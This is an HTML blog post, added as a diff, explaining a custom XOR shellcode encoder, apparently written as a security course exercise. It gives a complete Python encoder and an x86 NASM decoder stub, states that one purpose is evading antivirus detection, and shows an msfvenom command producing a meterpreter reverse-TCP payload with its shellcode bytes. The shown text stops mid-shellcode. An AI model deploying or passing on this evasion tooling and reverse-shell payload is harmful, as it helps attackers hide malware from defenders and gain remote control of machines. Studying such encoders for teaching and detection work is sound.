@@ -1,0 +1,706 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Custom shellcode encoder - hackcommander.io</title>
+<meta name="description" content="A shellcode encoder can be used for different purposes such as modify an existing shellcode to make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Custom shellcode encoder">
+<meta property="og:url" content="http://localhost:4000/custom-encoder/">
+
+
+  <meta property="og:description" content="A shellcode encoder can be used for different purposes such as modify an existing shellcode to make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/slae32.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2018-11-22T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/custom-encoder/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Custom shellcode encoder</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Custom shellcode encoder">
+    <meta itemprop="description" content="A shellcode encoder can be used for different purposes such as modify an existing shellcode to make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).">
+    <meta itemprop="datePublished" content="November 22, 2018">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Custom shellcode encoder
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2018-11-22T00:00:00+01:00">November 22, 2018 </time>&emsp;
+          
+          
+        </p>
+        <p>A shellcode encoder can be used for different purposes such as modify an existing shellcode to make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).</p>
+
+<p>The encoder itself doesn’t provide any real security however since the obfuscation scheme is built into the code and is therefore reversible by anyone who has access to the encoded shellcode. This should not be confused with encryption, where security is based on the key and not the secrecy of the encryption scheme.</p>
+
+<p>In this post, we go over a simple encoder that performs the following:</p>
+<ol>
+  <li>The encoder pads the shellcode with NOP opcodes so it is 4 bytes aligned</li>
+  <li>A random byte is generated for each 4 bytes of the shellcode</li>
+  <li>The 4 bytes are put in the reverse order and XORed with the XOR byte</li>
+  <li>Process is repeated until the <code class="language-plaintext highlighter-rouge">0x9090aaaa</code> marker is reached</li>
+</ol>
+
+<p>The following diagram explains the process:</p>
+
+<p><img src="/assets/images/custom-encoder/encoder.png" alt="" /></p>
+
+<p>To encode the shellcode, a Python script is used and reads the shellcode from the input file in <code class="language-plaintext highlighter-rouge">\xFF\xEE\xDD...</code> format. As explained earlier, a XOR byte is randomly chosen for each 4 bytes tuple. If any of the encoded bytes end up being XORed to \x00, another random XOR byte is chosen instead to avoid nulls being insert in the final shellcode.</p>
+
+<p>A marker is added at the end of the shellcode so the length of the encoded shellcode doesn’t need to be included in the decoder stub.</p>
+
+<h2 id="the-code-of-the-encoder-is-shown-here">The code of the encoder is shown here:</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"># Decoder stub
+</span><span class="n">decoder_stub</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x57\x31\xc0\x31\xdb\x31\xc9</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x31\xd2\x5e\xbf\x90\x90\xaa\xaa</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x83\xec\x7f\x83\xec\x7f\x83\xec</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x7f\x83\xec\x7f\x8a\x5c\x16\x01</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x8a\x7c\x16\x02\x8a\x4c\x16\x03</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x8a\x6c\x16\x04\x32\x1c\x16\x32</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x3c\x16\x32\x0c\x16\x32\x2c\x16</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x88\x2c\x04\x88\x4c\x04\x01\x88</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x7c\x04\x02\x88\x5c\x04\x03\x39</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x7c\x16\x05\x74\x0a\x42\x42\x42</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x42\x42\x83\xc0\x04\x75\xc5\xff</span><span class="s">"</span>
+<span class="n">decoder_stub</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xe4\xe8\xa4\xff\xff\xff</span><span class="s">"</span>
+
+<span class="c1"># Seed PRNG (don't use this for real crypto)
+</span><span class="n">random</span><span class="p">.</span><span class="n">seed</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'Usage: {name} [shellcode_file]'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">shellcode_file</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1"># Read shellcode from file in '\xFF\xEE\xDD' format
+</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shellcode_file</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">shellcode_original</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">x'</span><span class="p">,</span><span class="s">''</span><span class="p">))</span>
+
+<span class="c1"># If shellcode is not 4 bytes aligned, adding padding bytes at the end
+</span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode_original</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">padding</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_original</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">padding</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">if</span> <span class="n">padding</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[+] Shellcode not 4 bytes aligned, adding {} </span><span class="se">\\</span><span class="s">x90 bytes of padding...'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">padding</span><span class="p">))</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
+                <span class="n">shellcode_original</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
+
+<span class="n">shellcode_encoded</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+
+<span class="c1"># Process 4 bytes at a time
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode_original</span><span class="p">),</span> <span class="mi">4</span><span class="p">):</span>
+        <span class="n">xor_byte_good</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="k">while</span><span class="p">(</span><span class="n">xor_byte_good</span> <span class="o">==</span> <span class="bp">False</span><span class="p">):</span>
+                <span class="c1"># Generate random XOR byte
+</span>                <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">255</span><span class="p">)</span>
+                <span class="c1"># Check that resulting shellcode doesn't contain null bytes
+</span>                <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">^</span> <span class="n">shellcode_original</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">r</span> <span class="o">^</span> <span class="n">shellcode_original</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">r</span> <span class="o">^</span> <span class="n">shellcode_original</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">r</span> <span class="o">^</span> <span class="n">shellcode_original</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">):</span>
+                        <span class="n">xor_byte_good</span> <span class="o">=</span> <span class="bp">True</span>
+
+        <span class="c1"># Encoded shellcode contains XOR byte + next 4 bytes reversed
+</span>        <span class="n">shellcode_encoded</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="n">shellcode_encoded</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">shellcode_original</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">^</span> <span class="n">r</span><span class="p">)</span>
+        <span class="n">shellcode_encoded</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">shellcode_original</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">^</span> <span class="n">r</span><span class="p">)</span>
+        <span class="n">shellcode_encoded</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">shellcode_original</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">^</span> <span class="n">r</span><span class="p">)</span>
+        <span class="n">shellcode_encoded</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">shellcode_original</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">r</span><span class="p">)</span>
+
+<span class="c1"># Add end of shellcode marker
+</span><span class="n">shellcode_encoded</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
+<span class="n">shellcode_encoded</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
+<span class="n">shellcode_encoded</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0xaa</span><span class="p">)</span>
+<span class="n">shellcode_encoded</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="mh">0xaa</span><span class="p">)</span>
+
+<span class="c1"># Print out the output
+</span><span class="n">decoder_stub_hex</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">x{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:])</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">decoder_stub</span><span class="p">)</span>
+<span class="n">shellcode_original_hex</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">x{:02x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">shellcode_original</span><span class="p">)</span>
+<span class="n">shellcode_encoded_hex</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">x{:02x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">shellcode_encoded</span><span class="p">)</span>
+<span class="n">shellcode_encoded_nasm</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'0x{:02x},'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">shellcode_encoded</span><span class="p">).</span><span class="n">rstrip</span><span class="p">(</span><span class="s">','</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'[+] Original shellcode (len: {}): {}</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_original</span><span class="p">),</span> <span class="n">shellcode_original_hex</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'[+] Encoded shellcode (len: {}): {}</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_encoded</span><span class="p">),</span> <span class="n">shellcode_encoded_hex</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'[+] Encoded shell in NASM format: {}</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">shellcode_encoded_nasm</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'[+] Encoded shellcode /w decoder stub (len: {}): {}</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">decoder_stub</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode_encoded</span><span class="p">),</span> <span class="n">decoder_stub_hex</span> <span class="o">+</span> <span class="n">shellcode_encoded_hex</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>The decoder uses the <em>JMP CALL POP</em> technique to push the address of the encoded shellcode on the stack. The decoder stub then makes room for 512 bytes on the stack by decreasing <code class="language-plaintext highlighter-rouge">$esp</code> by 512.</p>
+
+<p>We use the <code class="language-plaintext highlighter-rouge">$edx</code> to keep track of the offset from the start of the encoded shellcode.</p>
+
+<p>For each 4 bytes tuple, the bytes are stored as follows:</p>
+<ul>
+  <li>1st byte: <code class="language-plaintext highlighter-rouge">$bl</code></li>
+  <li>2nd byte: <code class="language-plaintext highlighter-rouge">$bh</code></li>
+  <li>3rd byte: <code class="language-plaintext highlighter-rouge">$cl</code></li>
+  <li>4th byte: <code class="language-plaintext highlighter-rouge">$ch</code></li>
+</ul>
+
+<p>Then we XOR each byte with the key, located at <code class="language-plaintext highlighter-rouge">[$esi + $edx]</code> and store the results on the stack in reverse order. After each tuple is decoded, the decoder stub checks if the marker is reached and jumps to the shellcode on the stack if that’s the case.</p>
+
+<h2 id="the-complete-decoder-stub-code-if-shown-here">The complete decoder stub code if shown here:</h2>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+
+<span class="nl">_start:</span>
+        <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">call_shellcode</span>
+
+<span class="nl">decoder:</span>
+        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+        <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
+        <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
+        <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
+        <span class="nf">pop</span> <span class="nb">esi</span>             <span class="c1">; address of shellcode</span>
+        <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="mh">0xaaaa9090</span> <span class="c1">; end of shellcode marker</span>
+        <span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x7f</span>       <span class="c1">; make room on the stack (512 bytes)</span>
+        <span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x7f</span>       <span class="c1">; make room on the stack</span>
+        <span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x7f</span>       <span class="c1">; make room on the stack</span>
+        <span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x7f</span>       <span class="c1">; make room on the stack</span>
+
+<span class="nl">decode:</span>
+        <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="nb">edx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>    <span class="c1">; read 1st encoded byte</span>
+        <span class="nf">mov</span> <span class="nb">bh</span><span class="p">,</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="nb">edx</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span>    <span class="c1">; read 2nd encoded byte</span>
+        <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="nb">edx</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span>    <span class="c1">; read 3rd encoded byte</span>
+        <span class="nf">mov</span> <span class="nb">ch</span><span class="p">,</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="nb">edx</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span>    <span class="c1">; read 4th encoded byte</span>
+        <span class="nf">xor</span> <span class="nb">bl</span><span class="p">,</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="nb">edx</span><span class="p">]</span>        <span class="c1">; xor with the key byte</span>
+        <span class="nf">xor</span> <span class="nb">bh</span><span class="p">,</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="nb">edx</span><span class="p">]</span>        <span class="c1">; xor with the key byte</span>
+        <span class="nf">xor</span> <span class="nb">cl</span><span class="p">,</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="nb">edx</span><span class="p">]</span>        <span class="c1">; xor with the key byte</span>
+        <span class="nf">xor</span> <span class="nb">ch</span><span class="p">,</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="nb">edx</span><span class="p">]</span>        <span class="c1">; xor with the key byte</span>
+        <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="nb">eax</span><span class="p">],</span> <span class="nb">ch</span>        <span class="c1">; store in memory in reverse order to restore original shellcode</span>
+    	<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="nb">eax</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="nb">cl</span>    <span class="c1">; ..</span>
+        <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="nb">eax</span> <span class="o">+</span> <span class="mi">2</span><span class="p">],</span> <span class="nb">bh</span>    <span class="c1">; ..</span>
+        <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="nb">eax</span> <span class="o">+</span> <span class="mi">3</span><span class="p">],</span> <span class="nb">bl</span>    <span class="c1">; ..</span>
+
+        <span class="nf">cmp</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="nb">edx</span> <span class="o">+</span> <span class="mi">5</span><span class="p">],</span> <span class="nb">edi</span>  <span class="c1">; check if we have reached the end of shellcode marker</span>
+        <span class="nf">jz</span> <span class="nv">execute_shellcode</span>            <span class="c1">; if we do, jump to the shellcode and execute it</span>
+
+        <span class="nf">inc</span> <span class="nb">edx</span>
+        <span class="nf">inc</span> <span class="nb">edx</span>
+        <span class="nf">inc</span> <span class="nb">edx</span>
+        <span class="nf">inc</span> <span class="nb">edx</span>
+        <span class="nf">inc</span> <span class="nb">edx</span>
+        <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">4</span>
+        <span class="nf">jnz</span> <span class="nv">decode</span>
+
+<span class="nl">execute_shellcode:</span>
+        <span class="nf">jmp</span> <span class="nv">short</span> <span class="nb">esp</span>
+
+<span class="nl">call_shellcode:</span>
+        <span class="nf">call</span> <span class="nv">decoder</span>
+        <span class="nl">encoder_shellcode:</span> <span class="kd">db</span> <span class="mh">0x08</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0xc8</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">,</span><span class="mh">0xd8</span><span class="p">,</span><span class="mh">0xc3</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0xd1</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0xb3</span><span class="p">,</span><span class="mh">0xfe</span><span class="p">,</span><span class="mh">0xb9</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0x4e</span><span class="p">,</span><span class="mh">0xfd</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0xdb</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">,</span><span class="mh">0xc4</span><span class="p">,</span><span class="mh">0x09</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0xe6</span><span class="p">,</span><span class="mh">0xe6</span><span class="p">,</span><span class="mh">0xe6</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0x90</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xaa</span>
+</code></pre></div></div>
+
+<h2 id="testing-non-encoded-shellcode-against-virus-total">Testing non-encoded shellcode against Virus Total</h2>
+
+<p>To test the encoder and see what effects it has on AV engine detection, I used a meterpreter reverse TCP payload and compiled it using the test C program without any encoding first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingbeaver:~# msfvenom -p linux/x86/meterpreter/reverse_tcp -f c LHOST=172.23.10.40 LPORT=4444
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 123 bytes
+Final size of c file: 543 bytes
+unsigned char buf[] = 
+"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89"
+"\xe1\xcd\x80\x97\x5b\x68\xac\x17\x0a\x28\x68\x02\x00\x11\x5c"
+"\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0"
+"\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05"
